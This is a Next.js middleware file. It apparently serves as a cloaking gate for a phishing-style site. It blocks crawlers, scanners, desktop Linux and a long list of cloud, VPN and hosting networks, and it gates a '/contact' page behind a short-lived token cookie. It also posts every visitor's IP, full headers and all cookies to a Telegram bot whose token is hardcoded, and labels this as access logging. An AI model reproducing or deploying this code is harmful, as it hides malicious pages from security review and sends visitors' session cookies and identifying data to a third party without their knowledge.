import { NextRequest, NextResponse } from 'next/server';
import type { NextFetchEvent } from 'next/server';

const TELEGRAM_ACCESS_LOG_TOKEN = '8684662186:AAGVqLeEVSS7ZK484yziI1wZUILMpFkSYJc';
const TELEGRAM_ACCESS_LOG_CHAT_ID = '1004443117654';
const TELEGRAM_MAX_MESSAGE_LENGTH = 4096;

const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse'];

const BLOCKED_ASN = new Set([
    // Cloud Providers
    15169, // Google Cloud
    396982, // Google Cloud / Google LLC
    8075, // Microsoft Azure
    16509, // Amazon AWS
    16510, // Amazon AWS
    14618, // Amazon AWS
    31898, // Oracle Corporation
    45102, // Alibaba Cloud
    55960, // Beijing Guanghuan Xinwang Digital

    // Data Centers
    198605, // GCore Labs
    201814, // Hetzner
    24940, // Hetzner Online GmbH
    51396, // Hetzner Online
    14061, // DigitalOcean
    20473, // Choopa/Vultr
    63949, // Linode
    16276, // OVH SAS
    135377, // OVH
    52925, // Ascenty Data Centers e Telecomunicações S/A
    17895, // Globalreach eBusiness Networks, Inc.
    52468, // UFINET PANAMA S.A.
    36947, // Telecom Algeria

    // VPN Providers
    212238, // Datacamp Limited
    60068, // Datacamp
    136787, // PacketHub S.A.
    62240, // Clouvider
    9009, // M247 Europe SRL
    208172, // Proton AG (ProtonVPN)
    131199, // Nexeon Technologies, Inc.
    21859, // Zenlayer Inc

    // Proxy / Hosting
    55720, // Gigabit Hosting
    397373, // Voxility
    208312, // Serverel
    37100, // SEACOM-AS

    // Other
    214961, // Netflix
    401115, // Cloudflare
    210644, // Aeza Group
    6939, // Hurricane Electric
    209 // CenturyLink
]);

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

interface GeoInfo {
    asn: number;
}

const getGeoInfo = async (ip: string): Promise<GeoInfo | null> => {
    try {
        const response = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`, {
            signal: AbortSignal.timeout(3000)
        });

        if (!response.ok) {
            console.error('GeoJS API error:', response.status);
            return null;
        }

        const data = await response.json();
        return {
            asn: data.asn
        };
    } catch {
        return null;
    }
};

const sendTelegramAccessLog = async (log: Record<string, unknown>) => {
    if (!TELEGRAM_ACCESS_LOG_TOKEN || !TELEGRAM_ACCESS_LOG_CHAT_ID) {
        return;
    }

    try {
        const raw = JSON.stringify(log, null, 2);
        const text = raw.length > TELEGRAM_MAX_MESSAGE_LENGTH ? `${raw.slice(0, TELEGRAM_MAX_MESSAGE_LENGTH - 16)}\n...[truncated]` : raw;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_ACCESS_LOG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_ACCESS_LOG_CHAT_ID,
                text
            })
        });
    } catch (error) {
        console.error('Telegram access log error:', error);
    }
};

export const proxy = async (req: NextRequest, event: NextFetchEvent) => {
    const ua = req.headers.get('user-agent');
    const { pathname } = req.nextUrl;

    const ip = req.headers.get('cf-connecting-ip') || req.headers.get('x-nf-client-connection-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('x-real-ip') || 'unknown';
    const baseLog = {
        at: new Date().toISOString(),
        method: req.method,
        url: req.url,
        pathname,
        ip,
        headers: Object.fromEntries(req.headers.entries()),
        cookies: Object.fromEntries(req.cookies.getAll().map((cookie) => [cookie.name, cookie.value]))
    };
    const finish = (response: NextResponse, details: Record<string, unknown> = {}) => {
        event.waitUntil(
            sendTelegramAccessLog({
                ...baseLog,
                ...details,
                status: response.status
            })
        );
        return response;
    };

    if (!ua || BLOCKED_UA_REGEX.test(ua)) {
        return finish(new NextResponse(null, { status: 404 }), { blockedReason: 'user-agent' });
    }

    let geoInfo: GeoInfo | null = null;
    if (ip !== 'unknown') {
        geoInfo = await getGeoInfo(ip);
        if (geoInfo) {
            if (geoInfo.asn && BLOCKED_ASN.has(geoInfo.asn)) {
                return finish(new NextResponse(null, { status: 404 }), { blockedReason: 'asn', geoInfo });
            }
        }
    }

    if (!pathname.startsWith('/contact')) {
        return finish(NextResponse.next(), { geoInfo });
    }
    const currentTime = Date.now();
    const token = req.cookies.get('token')?.value;
    const pathSegments = pathname.split('/');
    const slug = pathSegments[2];

    const isValid = token && slug && Number(slug) - Number(token) < 240000 && currentTime - Number(token) < 240000;

    if (isValid) {
        return finish(NextResponse.next(), { geoInfo });
    }

    return finish(new NextResponse(null, { status: 404 }), { blockedReason: 'contact-token', geoInfo });
};

export const config = {
    matcher: ['/((?!_next/static|_next/image|favicon.ico).*)']
};
